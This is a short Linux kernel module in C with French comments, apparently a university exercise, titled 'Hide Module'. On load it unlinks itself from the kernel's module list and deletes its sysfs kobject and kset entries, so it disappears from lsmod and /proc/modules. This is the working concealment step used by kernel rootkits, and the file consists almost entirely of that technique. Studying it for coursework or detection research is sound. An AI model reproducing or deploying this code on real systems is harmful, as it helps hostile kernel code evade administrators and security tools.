#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/mm.h>
#include <linux/kobject.h>


MODULE_DESCRIPTION("Module \"Hide Module\" pour noyau linux");
MODULE_AUTHOR("AIDER Smail, UPMC");
MODULE_LICENSE("GPL");

static int __init hideModule_init(void)
{
	pr_info("INIT_HIDE_MODULE\n");

	/* retirer le module de la liste des modules (/proc/modules) -- invisible pour lsmod  */
	list_del(&THIS_MODULE->list);
	
	/* retirer le kobject de la list_head */
	list_del(&THIS_MODULE->holders_dir->entry);

	/* kset - removes the kset from the sysfs and decrements its reference count */ 
	kset_unregister(THIS_MODULE->holders_dir->kset);
	
	/* kobject parent - drop the reference to the parent object */
	kobject_del(THIS_MODULE->holders_dir->parent);
	
	/* kobject current  - unregister the kobject from the sysfs & cleanup the memory associated with the kobject */
	kobject_del(THIS_MODULE->holders_dir);
	kobject_put(THIS_MODULE->holders_dir);
	
	pr_info("module hidden \n");
	return 0;
}
module_init(hideModule_init);

static void __exit hideModule_exit(void)
{
	pr_info("EXIT_HIDE_MODULE");
}
module_exit(hideModule_exit);

